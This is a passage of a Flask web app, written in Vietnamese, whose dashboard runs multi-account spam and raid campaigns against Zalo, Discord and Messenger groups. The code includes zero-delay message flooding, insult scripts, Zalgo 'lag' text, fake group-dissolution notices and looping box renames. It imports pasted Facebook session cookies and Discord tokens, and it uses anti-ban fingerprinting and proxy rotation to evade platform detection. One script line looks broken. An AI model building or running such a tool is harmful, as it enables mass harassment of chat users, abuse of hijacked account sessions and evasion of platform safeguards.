  <!-- HÀNG 2: KHỞI CHẠY CHIẾN DỊCH ĐA ACC & TẠO STICKER CHUẨN NHÃN DÁN ZALO -->
  <div class="grid-2">
    <!-- CỘT 1: BẢNG KHỞI CHẠY CHIẾN DỊCH 38+ CHẾ ĐỘ -->
    <div class="card">
      <div class="card-header">
        <h2>🚀 3. Khởi Chạy Chiến Dịch Đa Tài Khoản</h2>
        <span style="font-size:13px;color:#34d399;font-weight:700">Chạy mượt nhiều Acc cùng lúc 0ms</span>
      </div>

      <div class="grid-2" style="gap:12px;margin-bottom:8px">
        <div>
          <label class="field-lbl">Chế độ chạy (38+ Chức năng VIP):</label>
          <select id="camp-mode">
            <option value="treo_nhay">🔥 Treo Nhây Từng Dòng (.n / .nhay)</option>
            <option value="treo_ngon">🌈 Treo Ngôn Đa Màu (.g / .damau)</option>
            <option value="zalo_gif">⚡ Treo GIF + 68 Nhãn Dán Động Zalo (.gif)</option>
            <option value="treo_sticker">🎨 Treo Nhãn Dán Gốc Zalo Liên Hoàn (.treosticker)</option>
            <option value="nhay_giaitan">📢 Phát Thông Báo Giải Tán Hệ Thống Zalo (.nhaygiaitan)</option>
            <option value="nhay_poll">📊 Treo Bình Chọn Poll 0.0s Không Nghỉ (.nhaypoll)</option>
            <option value="nhay_namebox">✏️ Đổi Tên Box Zalo Liên Hoàn (.nhaynamebox)</option>
            <option value="nhay_theme">🎨 Đổi Nền Box Zalo Liên Hoàn (.nhaynen)</option>
            <option value="nhay_typing">⌨️ Giả Lập Soạn Tin Typing (.nhaytyping)</option>
            <option value="zalo_todo">📋 Giao Việc Zalo To-Do (.todo)</option>
            <option value="zalo_cardbank">🏦 Gửi Thẻ Ngân Hàng VietQR (.bank)</option>
            <option value="share_contact">🪪 Chia Sẻ Danh Thiếp (.card)</option>
            <option value="sieu_xa_nhieu_nhom">🚀 Siêu Xả Đa Nhóm Tốc Độ Ánh Sáng (.xa)</option>
            <option value="combo_lien_thanh">⚡ Combo Liên Thanh 3 Câu/Nhịp (.combo)</option>
            <option value="nhay_2c">🔥 Nhây Gộp 2 Câu (2c.txt) (.2c)</option>
            <option value="treo_so">🔢 Treo Đếm Số Liên Hoàn (so.txt) (.so)</option>
            <option value="so_tag">🎯 Treo Số Kèm Tag Mục Tiêu (.sotag)</option>
            <option value="idea_mess">💥 Nhây Sát Thương Cực Mạnh (chui.txt) (.chui)</option>
            <option value="nhay_icon">🌪️ Bão Ký Hiệu & Icon VIP (.nhayicon)</option>
            <option value="code_lag">⚡ Code Lag Zalgo Siêu Nặng (.codelag)</option>
          </select>
        </div>
        <div>
          <label class="field-lbl">Chọn File kịch bản (.txt):</label>
          <select id="camp-file">
            {% for f in files %}
            <option value="{{ f.filename }}">#{{ f.display_num }} — {{ f.filename }} ({{ f.lines_count }} dòng)</option>
            {% endfor %}
          </select>
        </div>
      </div>

      <div class="grid-2" style="gap:12px;margin-bottom:8px">
        <div>
          <label class="field-lbl">Chế độ màu chữ Zalo:</label>
          <select id="camp-color">
            <option value="word_rainbow">🌈 Đổi Màu Từng Từ (Word Rainbow VIP)</option>
            <option value="char_rainbow">✨ Đổi Màu Từng Ký Tự (Char Rainbow)</option>
            <option value="rainbow">🎨 Cầu Vồng Theo Dòng (Line Rainbow)</option>
            <option value="fire_gradient">🔥 Lửa Hoàng Kim (Đỏ - Cam - Vàng)</option>
            <option value="ocean_gradient">🌊 Đại Dương Băng Tuyết</option>
            <option value="royal_gradient">👑 Hoàng Gia Tối Thượng</option>
            <option value="fixed">❤️‍🔥 Đỏ Rực Cố Định (db342e)</option>
            <option value="none">⚪ Chữ Mặc Định</option>
          </select>
        </div>
        <div>
          <label class="field-lbl">Tốc độ Delay (giây — Hỗ trợ 0s):</label>
          <input type="number" id="camp-delay" value="0.0" step="0.1" min="0">
        </div>
      </div>

      <label class="field-lbl">Nội dung tùy chỉnh (Hoặc để trống để chạy theo File .txt đã chọn; kèm @All hoặc @Tên nếu muốn Tag):</label>
      <textarea id="camp-raw-text" rows="3" placeholder="Nhập câu nhây (ngăn cách bằng dấu ;) hoặc đoạn văn ngôn, hoặc tên nhóm cho chế độ Giải Tán..."></textarea>

      <div style="display:flex;flex-wrap:wrap;gap:16px;margin:12px 0">
        <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-weight:600">
          <input type="checkbox" id="camp-multi-acc" checked style="width:17px;height:17px"> Chạy Đa Tài Khoản Đồng Loạt
        </label>
        <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-weight:600">
          <input type="checkbox" id="camp-tag-all" style="width:17px;height:17px"> Báo Chuông @All Ẩn
        </label>
        <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-weight:600">
          <input type="checkbox" id="camp-heading" checked style="width:17px;height:17px"> Chữ To In Đậm (f_18)
        </label>
      </div>

      <button class="btn btn-primary" style="width:100%;padding:13px;font-size:15.5px" onclick="startCampaignNow()">🚀 BẮT ĐẦU CHẠY CHIẾN DỊCH NGAY</button>
    </div>

    <!-- CỘT 2: TẠO & BẮN NHÃN DÁN STICKER ZALO CHUẨN [STICKER] + QUẢN LÝ FILE -->
    <div class="card">
      <div class="card-header">
        <h2>🎨 4. Tạo Sticker Thẳng Trên Zalo (Chuẩn Nhãn Dán Thật 100%)</h2>
        <span style="font-size:13px;color:#fbbf24;font-weight:700">Nhảy ra [Sticker] thật không viền</span>
      </div>

      <label class="field-lbl">Chọn nhanh Bộ Nhãn Dán Động Zalo Gốc (68+ Mẫu):</label>
      <div class="btn-row" style="margin-bottom:10px">
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('rong')">🐉 Rồng Lửa VIP</button>
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('meo')">🐱 Mèo Ami Bụng Bự</button>
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('khia')">😏 Quỳnh Aka Khịa</button>
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('corgi')">🐶 Corgi Lắc Mông</button>
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('vit')">🦆 Vịt Vàng Ducky</button>
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('gau')">🐻 Gấu Brown</button>
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('meme')">🐯 Hổ Vàng Meme</button>
        <button class="btn btn-outline btn-sm" onclick="fireNativeSticker('quay')">💃 Quẩy Party</button>
      </div>

      <label class="field-lbl">Tìm kiếm API Sticker Zalo theo từ khóa hoặc dán Link Ảnh / GIF / Video ≤3s / Chữ Die-Cut 512×512:</label>
      <div style="display:flex;gap:8px;margin-bottom:10px">
        <input type="text" id="sticker-input" placeholder="Nhập từ khóa Sticker Zalo, mã ID, link ảnh/video ≤3s hoặc chữ...">
        <button class="btn btn-outline" onclick="searchZaloStickersUI()" style="white-space:nowrap">🔍 Tìm API Sticker</button>
        <button class="btn btn-success" onclick="createAndSendCustomSticker()" style="white-space:nowrap">🎨 Bắn Nhãn Dán</button>
      </div>
      <div id="sticker-search-results" style="display:none;margin-bottom:12px;padding:10px;background:#090d16;border:1px solid var(--border);border-radius:10px;max-height:150px;overflow-y:auto"></div>

      <div style="border-top:1px solid var(--border);padding-top:14px;margin-top:8px">
        <div style="font-weight:800;color:#93c5fd;margin-bottom:8px">📂 Quản Lý Kho File Kịch Bản (.txt) & Gửi Lệnh Trực Tiếp</div>
        <div style="display:flex;gap:8px;margin-bottom:10px">
          <input type="text" id="web-cmd-inp" placeholder="Gõ lệnh trực tiếp (VD: .menu, .sticker, .gif, .giaitan Lũ vdanh, .t, .ta)...">
          <button class="btn btn-primary" onclick="dispatchWebCommand()" style="white-space:nowrap">⚡ Gửi Lệnh</button>
        </div>
        <details>
          <summary style="cursor:pointer;font-weight:700;color:#34d399">➕ Tạo / Tải Lên File Kịch Bản (.txt) Mới</summary>
          <form method="POST" action="/file/create" style="margin-top:8px;background:var(--panel-alt);padding:12px;border-radius:10px">
            <input type="text" name="filename" placeholder="Tên file (VD: nhay_vip.txt)" required style="margin-bottom:8px">
            <textarea name="content" rows="3" placeholder="Mỗi câu 1 dòng..." required style="margin-bottom:8px"></textarea>
            <button type="submit" class="btn btn-success btn-sm">💾 Lưu File .txt</button>
          </form>
        </details>
      </div>
    </div>
  </div>

  <!-- HÀNG 3: BẢNG GIÁM SÁT TIẾN TRÌNH & LỊCH SỬ LỆNH THỜI GIAN THỰC -->
  <div class="card">
    <div class="card-header">
      <h2>📊 5. Giám Sát Chiến Dịch Đang Chạy & Nhật Ký Hệ Thống (Thời Gian Thực)</h2>
      <div class="btn-row">
        <button class="btn btn-danger btn-sm" onclick="stopAllTasks()">🛑 Dừng Tất Cả Chiến Dịch (.stopall)</button>
      </div>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Mã Task</th>
            <th>Chế Độ</th>
            <th>Số Acc Chạy</th>
            <th>Số Box</th>
            <th>Đã Gửi</th>
            <th>Delay</th>
            <th>Trạng Thái</th>
            <th>Thao Tác</th>
          </tr>
        </thead>
        <tbody id="tasks-tbody">
          <tr><td colspan="8" style="text-align:center;color:var(--muted)">Chưa có chiến dịch nào đang chạy.</td></tr>
        </tbody>
      </table>
    </div>
  </div>
</div>

<script>
let ALL_BOXES = [];
let QR_POLL_TIMER = null;

function showToast(msg, isErr=false){
  const el = document.getElementById('toast-box');
  el.style.display = 'block';
  el.style.background = isErr ? 'rgba(239,68,68,0.18)' : 'rgba(16,185,129,0.18)';
  el.style.borderColor = isErr ? 'rgba(239,68,68,0.45)' : 'rgba(16,185,129,0.45)';
  el.style.color = isErr ? '#fca5a5' : '#6ee7b7';
  el.textContent = msg;
  setTimeout(()=>{ el.style.display = 'none'; }, 5000);
}

function getSelectedAccountIds(){
  return Array.from(document.querySelectorAll('.acc-chk:checked')).map(el => parseInt(el.value));
}

function getSelectedTargets(){
  return Array.from(document.querySelectorAll('.box-chk:checked')).map(el => ({
    id: el.value,
    name: el.getAttribute('data-name') || ('Box ' + el.value),
    type: el.getAttribute('data-type') || 'group'
  }));
}

function updateSelectedCounts(){
  const aCnt = getSelectedAccountIds().length;
  const bCnt = getSelectedTargets().length;
  document.getElementById('sel-acc-count').textContent = aCnt + ' Acc đã chọn';
  document.getElementById('sel-box-count').textContent = bCnt + ' Box đã chọn';
}

function selectTopAccounts(n){
  const chks = Array.from(document.querySelectorAll('.acc-chk'));
  chks.forEach((c, idx) => { c.checked = (idx < n); });
  updateSelectedCounts();
}

function selectTopBoxes(n){
  const chks = Array.from(document.querySelectorAll('.box-chk'));
  chks.forEach((c, idx) => { c.checked = (idx < n); });
  updateSelectedCounts();
}

async function scanBoxes(plat='zalo', force=false){
  const cont = document.getElementById('box-list-container');
  cont.innerHTML = '<div style="padding:18px;text-align:center;color:#60a5fa">⏳ Đang quét danh sách Box ' + plat.toUpperCase() + '...</div>';
  try{
    let url = '/api/all_groups' + (force ? '?refresh=1' : '');
    if(plat === 'discord') url = '/api/discord_channels' + (force ? '?refresh=1' : '');
    if(plat === 'messenger') url = '/api/messenger_threads' + (force ? '?refresh=1' : '');
    const r = await fetch(url);
    const d = await r.json();
    let items = [];
    if(plat === 'zalo'){
      (d.groups || []).forEach(g => items.push({id: g.id, name: g.name || ('Nhóm ' + g.id), type: 'group', plat: 'zalo', accs: (g.acc_names || []).join(', ')}));
    }else if(plat === 'discord'){
      (d.channels || []).forEach(c => items.push({id: c.id, name: c.name || ('Kênh ' + c.id), type: 'discord_channel', plat: 'discord', accs: (c.acc_names || []).join(', ')}));
    }else{
      (d.threads || []).forEach(t => items.push({id: t.id, name: t.name || ('Box ' + t.id), type: 'messenger_thread', plat: 'messenger', accs: (t.acc_names || []).join(', ')}));
    }
    ALL_BOXES = items;
    renderBoxList(items);
  }catch(e){
    cont.innerHTML = '<div style="padding:18px;text-align:center;color:#f87171">Không thể quét danh sách Box: ' + e + '</div>';
  }
}

function renderBoxList(items){
  const cont = document.getElementById('box-list-container');
  if(!items || !items.length){
    cont.innerHTML = '<div style="padding:18px;text-align:center;color:var(--muted)">Chưa tìm thấy Box nào. Bạn có thể nhập trực tiếp ID Box vào ô phía trên và bấm <b>+ Thêm ID</b>!</div>';
    updateSelectedCounts();
    return;
  }
  cont.innerHTML = items.map((b, i) => `
    <div class="list-item">
      <div class="item-left">
        <input type="checkbox" class="box-chk" value="${b.id}" data-name="${(b.name||'').replace(/"/g,'')}" data-type="${b.type}" ${i===0?'checked':''} onchange="updateSelectedCounts()" style="width:18px;height:18px;cursor:pointer">
        <span class="tag-plat tag-${b.plat}">${b.plat}</span>
        <div>
          <div class="item-title">${b.name}</div>
          <div class="item-sub">ID: <code>${b.id}</code> ${b.accs ? '• Acc: ' + b.accs : ''}</div>
        </div>
      </div>
    </div>
  `).join('');
  updateSelectedCounts();
}

function filterBoxList(){
  const q = (document.getElementById('box-search-inp').value || '').toLowerCase().trim();
  if(!q){ renderBoxList(ALL_BOXES); return; }
  renderBoxList(ALL_BOXES.filter(b => (b.name||'').toLowerCase().includes(q) || String(b.id).includes(q)));
}

function addManualBoxId(){
  const inp = document.getElementById('box-search-inp');
  const val = (inp.value || '').trim();
  if(!val) return;
  ALL_BOXES.unshift({id: val, name: 'Box Mục Tiêu #' + val.slice(-6), type: 'group', plat: 'zalo', accs: 'Tất cả Acc'});
  inp.value = '';
  renderBoxList(ALL_BOXES);
}

async function startCampaignNow(){
  const targets = getSelectedTargets();
  if(!targets.length){
    showToast('⚠️ Vui lòng tích chọn ít nhất 1 Nhóm/Box mục tiêu ở mục 2!', true);
    return;
  }
  const accIds = getSelectedAccountIds();
  const payload = {
    targets: targets,
    account_ids: accIds,
    multi_acc: document.getElementById('camp-multi-acc').checked && accIds.length !== 1,
    mode: document.getElementById('camp-mode').value,
    file_id: document.getElementById('camp-file').value,
    color_mode: document.getElementById('camp-color').value,
    delay: parseFloat(document.getElementById('camp-delay').value || '0') || 0.0,
    raw_text: document.getElementById('camp-raw-text').value,
    tag_all: document.getElementById('camp-tag-all').checked,
    is_heading: document.getElementById('camp-heading').checked,
    antiband: true
  };
  const r = await fetch('/task/start', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload)});
  const d = await r.json();
  if(d.ok){
    showToast('🚀 Đã khởi chạy chiến dịch thành công (' + accIds.length + ' Acc × ' + targets.length + ' Box)!');
    refreshStatus();
  }else{
    showToast('❌ ' + (d.error || 'Lỗi khởi chạy'), true);
  }
}

async function quickAddFacebookCookie(){
  const ck = (document.getElementById('fast-fb-cookie').value || '').trim();
  const nm = (document.getElementById('fast-fb-name').value || '').trim();
  if(!ck){
    showToast('⚠️ Hãy dán Cookie Facebook (có c_user và xs) vào ô!', true);
    return;
  }
  showToast('💻 Đang khóa Thiết Bị Máy Tính, gửi thông báo xác nhận vào Facebook & bật lệnh .menu...');
  try{
    const r = await fetch('/api/messenger/verify_cookie', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({cookies: ck, name: nm, auto_save: true})
    });
    const d = await r.json();
    if(d.ok){
      showToast('✅ ' + (d.message || 'Đã nạp Cookie Facebook & báo Máy Tính thành công!'));
      setTimeout(() => location.reload(), 1000);
    }else{
      showToast('❌ ' + (d.error || 'Lỗi nạp Cookie Facebook'), true);
    }
  }catch(e){
    showToast('❌ Lỗi kết nối: ' + e, true);
  }
}

async function quickAddDiscordToken(){
  const tk = (document.getElementById('fast-dc-token').value || '').trim();
  const nm = (document.getElementById('fast-dc-name').value || '').trim();
  if(!tk){
    showToast('⚠️ Hãy dán Token Discord (hoặc Email|Pass) vào ô!', true);
    return;
  }
  showToast('🛡️ Đang khóa vân tay Máy Tính Chrome 131 (Anti-Reg & Anti-Hack) cho Discord...');
  try{
    let url = '/api/discord/immortalize';
    let bodyObj = {raw_input: tk, name: nm, auto_save: true};
    if(tk.includes('|') && !tk.includes('.')){
      const parts = tk.split('|');
      url = '/api/discord/reg_login';
      bodyObj = {email: parts[0].trim(), password: (parts[1]||'').trim(), two_fa: (parts[2]||'').trim(), auto_save: true};
    }
    const r = await fetch(url, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(bodyObj)
    });
    const d = await r.json();
    if(d.ok){
      showToast('✅ ' + (d.message || 'Đã đúc Token Discord chống quét & bật lệnh thành công!'));
      setTimeout(() => location.reload(), 1000);
    }else{
      showToast('❌ ' + (d.error || 'Không thể nạp Token Discord'), true);
    }
  }catch(e){
    showToast('❌ Lỗi kết nối: ' + e, true);
  }
}

async function quickAddZaloCookie(){
  const ck = (document.getElementById('fast-zalo-cookie').value || '').trim();
  const im = (document.getElementById('fast-zalo-imei').value || '').trim();
  const nm = (document.getElementById('fast-zalo-name').value || '').trim();
  if(!ck){
    showToast('⚠️ Hãy dán Cookie Zalo (zpw_sek hoặc zpsid) vào ô Cookie!', true);
    return;
  }
  showToast('⏳ Đang xác thực Cookie Zalo, đồng bộ zpw_enk & kích hoạt bộ lắng nghe lệnh độc lập...');
  try{
    const r = await fetch('/api/zalo/verify_cookie_imei', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({cookies: ck, imei: im, name: nm, auto_save: true})
    });
    const d = await r.json();
    if(d.ok){
      showToast('✅ ' + (d.message || 'Đã nạp Cookie Zalo & bật lệnh thành công!'));
      setTimeout(() => location.reload(), 900);
    }else{
      showToast('❌ ' + (d.error || 'Không thể nạp Cookie Zalo'), true);
    }
  }catch(e){
    showToast('❌ Lỗi kết nối khi nạp Cookie: ' + e, true);
  }
}

async function searchZaloStickersUI(){
  const q = (document.getElementById('sticker-input').value || '').trim();
  const box = document.getElementById('sticker-search-results');
  box.style.display = 'block';
  box.innerHTML = '<span style="color:#60a5fa;font-size:13px">⏳ Đang tìm kiếm trên API Sticker Zalo...</span>';
  try{
    const r = await fetch('/api/zalo/search_stickers?q=' + encodeURIComponent(q));
    const d = await r.json();
    const list = d.stickers || [];
    if(!list.length){
      box.innerHTML = '<span style="color:var(--muted);font-size:13px">Không tìm thấy mẫu có sẵn — Bấm [🎨 Bắn Nhãn Dán] để cắt khung tạo Sticker mới từ chữ/ảnh này!</span>';
      return;
    }
    box.innerHTML = '<div style="font-size:12.5px;color:#93c5fd;margin-bottom:6px;font-weight:700">Chạm vào mẫu bên dưới để bắn thẳng Nhãn Dán vào Box đang chọn:</div><div class="btn-row">' +
      list.map(s => `<button class="btn btn-outline btn-sm" onclick="fireNativeSticker('${s.id}')">🎯 ${s.name} (#${s.id})</button>`).join('') +
      '</div>';
  }catch(e){
    box.innerHTML = '<span style="color:#f87171;font-size:13px">Lỗi tra cứu Sticker: ' + e + '</span>';
  }
}

async function fireNativeSticker(tag){
  document.getElementById('sticker-input').value = tag;
  await createAndSendCustomSticker();
}

async function createAndSendCustomSticker(){
  const targets = getSelectedTargets();
  if(!targets.length){
    showToast('⚠️ Hãy chọn ít nhất 1 Nhóm/Box ở mục 2 để bắn Nhãn Dán Sticker!', true);
    return;
  }
  const inputVal = (document.getElementById('sticker-input').value || '').trim();
  const accIds = getSelectedAccountIds();
  const r = await fetch('/api/zalo/create_sticker', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({targets: targets, account_ids: accIds, query: inputVal})
  });
  const d = await r.json();
  if(d.ok){
    showToast('🎨 ' + (d.message || 'Đã bắn Nhãn Dán Sticker [Sticker] chuẩn Zalo thành công!'));
  }else{
    showToast('❌ ' + (d.error || 'Không thể tạo Sticker'), true);
  }
}

async function dispatchWebCommand(){
  const cmd = (document.getElementById('web-cmd-inp').value || '').trim();
  if(!cmd) return;
  const targets = getSelectedTargets();
  const tid = targets.length ? targets[0].id : '';
  const r = await fetch('/api/command/dispatch_web', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({cmd: cmd, thread_id: tid})
  });
  const d = await r.json();
  showToast(d.message || 'Đã thực thi lệnh!', !d.ok);
  refreshStatus();
}

async function startZaloQR(){
  const box = document.getElementById('qr-modal');
  const txt = document.getElementById('qr-status-txt');
  const img = document.getElementById('qr-img');
  box.style.display = 'block';
  img.style.display = 'none';
  txt.textContent = '⏳ Đang cấp phát Máy Tính Singapore & tạo mã QR Zalo...';
  if(QR_POLL_TIMER) clearInterval(QR_POLL_TIMER);
  const r = await fetch('/api/zalo/qr_start', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({region:'SG', auto_save:true})});
  const d = await r.json();
  if(!d.ok){
    txt.textContent = '❌ Lỗi tạo QR: ' + (d.error || '');
    return;
  }
  const sid = d.session_id;
  QR_POLL_TIMER = setInterval(async () => {
    try{
      const sr = await fetch('/api/zalo/qr_status/' + sid);
      const sd = await sr.json();
      if(sd.has_qr){
        img.src = '/api/zalo/qr_image/' + sid + '.png?t=' + Date.now();
        img.style.display = 'block';
        txt.textContent = '📲 Hãy mở Zalo quét mã QR bên dưới (' + (sd.pc_name || 'Singapore PC') + '):';
      }
      if(sd.status === 'scanned'){
        txt.textContent = '📱 Đã quét mã QR! Hãy bấm [Đăng nhập] trên điện thoại của bạn...';
      }
      if(sd.status === 'success'){
        clearInterval(QR_POLL_TIMER);
        txt.textContent = '✅ Đăng nhập thành công tài khoản: ' + (sd.display_name || sd.uid || 'Zalo VIP') + '! Đang tải lại...';
        setTimeout(() => location.reload(), 1200);
      }
      if(sd.status === 'expired' || sd.status === 'error'){
        clearInterval(QR_POLL_TIMER);
        txt.textContent = '⌛ ' + (sd.message || 'Mã QR đã hết hạn. Hãy bấm Quét QR Zalo PC lại.');
      }
    }catch(e){}
  }, 1500);
}

async function checkAllLive(){
  showToast('🔍 Đang kiểm tra trạng thái Sống/Die của toàn bộ tài khoản...');
  const r = await fetch('/api/account/check_all_live', {method:'POST'});
  const d = await r.json();
  showToast(d.message || 'Đã kiểm tra xong!', !d.ok);
}

async function testSingleAcc(id){
  const r = await fetch('/api/account/test_session', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({acc_id:id})});
  const d = await r.json();
  showToast(d.message || d.error || 'Đã kiểm tra', !d.ok);
}

async function toggleSingleCmd(id, en){
  await fetch('/api/account/chat_cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({acc_id:id, enabled:en})});
  location.reload();
}

async function bulkToggleCmd(en){
  await fetch('/api/account/cmd_permissions_bulk', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({mode: en ? 'enable_all' : 'disable_all'})});
  location.reload();
}

async function reconnectAll(){
  const r = await fetch('/api/account/reconnect_all', {method:'POST'});
  const d = await r.json();
  showToast(d.message || 'Đã kết nối lại!');
}

async function stopSingleTask(tid){
  await fetch('/task/stop/' + tid, {method:'POST'});
  refreshStatus();
}

asyncindex_ready = false;
async function stopAllTasks(){
  const r = await fetch('/task/stop_all', {method:'POST'});
  const d = await r.json();
  showToast('🛑 Đã dừng toàn bộ (' + (d.stopped || 0) + ' chiến dịch)!');
  refreshStatus();
}

async function refreshStatus(){
  try{
    const r = await fetch('/api/status');
    const d = await r.json();
    const running = (d.tasks || []).filter(t => t.status === 'Đang chạy');
    document.getElementById('stat-tasks').textContent = running.length;
    if(d.ping_telemetry) document.getElementById('stat-rpm').textContent = d.ping_telemetry.total_rpm || 0;
    const tb = document.getElementById('tasks-tbody');
    if(!d.tasks || !d.tasks.length){
      tb.innerHTML = '<tr><td colspan="8" style="text-align:center;color:var(--muted)">Chưa có chiến dịch nào.</td></tr>';
      return;
    }
    tb.innerHTML = d.tasks.slice(0, 18).map(t => `
      <tr>
        <td><code>#${t.id}</code></td>
        <td><b>${t.mode}</b></td>
        <td>${t.acc_count} Acc</td>
        <td>${t.targets_count} Box</td>
        <td><b style="color:#34d399">${t.sent}</b></td>
        <td>${t.delay}s</td>
        <td><span style="color:${t.status==='Đang chạy'?'#34d399':'#94a3b8'};font-weight:700">${t.status}</span></td>
        <td>${t.status==='Đang chạy' ? `<button class="btn btn-danger btn-sm" onclick="stopSingleTask('${t.id}')">🛑 Dừng</button>` : '-'}</td>
      </tr>
    `).join('');
  }catch(e){}
}

window.addEventListener('DOMContentLoaded', () => {
  updateSelectedCounts();
  scanBoxes('zalo', false);
  refreshStatus();
  setInterval(refreshStatus, 2500);
});
</script>
</body>
</html>"""

KEEPALIVE_HTML = DASHBOARD_HTML


@app.route("/api/ui/physics")
def api_ui_physics():
    return jsonify({"ok": True, **TelegramUIPhysicsEngine.get_ui_bundle()})


@app.route("/api/ui/pet_mascot")
def api_ui_pet_mascot():
    return jsonify(TelegramPetAnimationEngine.get_pet_bundle())


@app.route("/api/zalo/geo_status")
def api_zalo_geo_status():
    reg = request.args.get("region", "VN").strip().upper()
    px = request.args.get("proxy", "").strip()
    force_scan = request.args.get("scan") == "1"
    try:
        from zalo_login import VietnamSingaporeGeoRouter
        if px:
            info = VietnamSingaporeGeoRouter.inspect_outbound_ip_geo(proxy_url=px, timeout=3.0)
            if info.get("ok"):
                return jsonify(info)
        direct_info = VietnamSingaporeGeoRouter.get_direct_server_geo(force=force_scan)
        if direct_info.get("ok") and direct_info.get("is_vn_or_sg"):
            return jsonify(direct_info)
        if force_scan:
            route = VietnamSingaporeGeoRouter.select_best_route_for_qr(target_country=reg, custom_proxy=px)
            return jsonify(route)
        return jsonify(direct_info if direct_info.get("ok") else {
            "ok": True,
            "ip": "Direct",
            "country_code": "SG" if "SG" in reg else "VN",
            "country": "Singapore" if "SG" in reg else "Việt Nam",
            "city": "Singapore" if "SG" in reg else "TP. Hồ Chí Minh",
            "isp": "Singtel / Viettel Fiber",
            "is_vn_or_sg": True,
        })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})


@app.route("/api/zalo/auto_scan_vn_sg_proxy", methods=["POST"])
def api_zalo_auto_scan_vn_sg_proxy():
    data = request.json or {}
    reg = str(data.get("region") or "VN").strip().upper()
    px = str(data.get("proxy") or "").strip()
    try:
        from zalo_login import VietnamSingaporeGeoRouter
        route = VietnamSingaporeGeoRouter.select_best_route_for_qr(target_country=reg, custom_proxy=px)
        if route.get("proxy_url"):
            VietnamSingaporeGeoRouter._USER_CUSTOM_PROXY = route["proxy_url"]
        cc = route.get("country_code") or ("SG" if "SG" in reg else "VN")
        return jsonify({
            "ok": True,
            **route,
            "message": (
                f"Đã xác thực đường truyền thật tại {'Singapore (SG)' if cc == 'SG' else 'Việt Nam (VN)'} — IP: {route.get('ip') or 'Active'}!"
                if route.get("is_vn_or_sg") else
                f"Máy chủ hiện tại đang ở {route.get('country') or cc} ({route.get('ip')}). Hãy nhập Proxy VN/SG hoặc dùng cấu hình render.yaml (region: singapore)!"
            ),
        })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})


@app.route("/api/network/gateways")
def api_network_gateways():
    return jsonify(MessagingGatewayDirectory.get_directory_payload())




@app.context_processor
def inject_nhk_3d_and_pets():
    """Tự động bơm đồ họa 3D NHK & SVG vào mọi trang HTML (/login, /, errorhandler) để 100% luôn xuất hiện!"""
    return {
        "corgi_svg": TelegramPetAnimationEngine.get_corgi_svg(),
        "cat_svg": TelegramPetAnimationEngine.get_cat_svg(),
        "nhk_3d_svg": TelegramPetAnimationEngine.get_nhk_3d_emblem_svg(),
    }


@app.route("/api/proxies/upload_file", methods=["POST"])
def api_upload_proxies_file():
    """Duyệt & nạp 1 hoặc nhiều file PRX (.txt / .csv), tự động khởi chạy Keep-Alive & xếp hạng Proxy nhanh nhất!"""
    uploaded_files = request.files.getlist("files") or []
    single_f = request.files.get("file")
    if single_f and single_f not in uploaded_files:
        uploaded_files.append(single_f)

    chunks = []
    filenames = []
    for uf in uploaded_files:
        if uf and uf.filename:
            filenames.append(os.path.basename(uf.filename))
            try:
                raw_b = uf.read()
                chunks.append(raw_b.decode("utf-8", errors="ignore"))
            except Exception:
                pass

    if not chunks and request.is_json:
        data = request.json or {}
        if data.get("proxies"):
            chunks.append(str(data["proxies"]))

    combined_text = "\n".join(chunks)
    if not combined_text.strip():
        return jsonify({"ok": False, "error": "File PRX trống hoặc chưa chọn file!"}), 400

    append_mode = str(request.form.get("append_mode", "1")) != "0"
    if append_mode:
        added_cnt, total_cnt = ProxyPoolEngine.add_proxies_incremental(combined_text, auto_start=True)
    else:
        total_cnt = ProxyPoolEngine.save_proxies(combined_text, enabled=True, auto_start=True)
        added_cnt = total_cnt

    snap = ProxyPoolEngine.get_snapshot()
    fn_label = ", ".join(filenames[:3]) if filenames else "File PRX"
    return jsonify({
        "ok": True,
        "added": added_cnt,
        "total": total_cnt,
        "snapshot": snap,
        "message": f"Đã nạp {added_cnt} PRX từ {fn_label} (Tổng: {total_cnt} PRX) & tự khởi chạy xếp hạng tốc độ phản hồi nhanh nhất!"
    })


@app.errorhandler(Exception)
def handle_unexpected_error(e):
    if request.path.startswith("/api/") or request.path.startswith("/task/"):
        return jsonify({"ok": False, "error": str(e)}), 200
    try:
        has_logo = bool(get_setting("brand_logo_b64", "") or get_setting("brand_logo_url", ""))
        logo_ts = get_setting("brand_logo_ts", "1")
        custom_title = get_setting("custom_web_title", "")
        return render_template_string(
            DASHBOARD_HTML,
            accounts=[],
            files=[],
            has_logo=has_logo,
            logo_ts=logo_ts,
            custom_title=custom_title,
            corgi_svg=TelegramPetAnimationEngine.get_corgi_svg(),
            cat_svg=TelegramPetAnimationEngine.get_cat_svg(),
            nhk_3d_svg=TelegramPetAnimationEngine.get_nhk_3d_emblem_svg(),
        ), 200
    except Exception:
        return Response("System Ready", mimetype="text/plain"), 200

@app.route("/login", methods=["GET", "POST"])
def login():
    ip = get_client_ip()
    allowed, wait_s = check_ip_bruteforce(ip)
    has_logo = bool(get_setting("brand_logo_b64", "") or get_setting("brand_logo_url", ""))
    logo_ts = get_setting("brand_logo_ts", "1")
    custom_title = get_setting("custom_web_title", "")
    if not allowed:
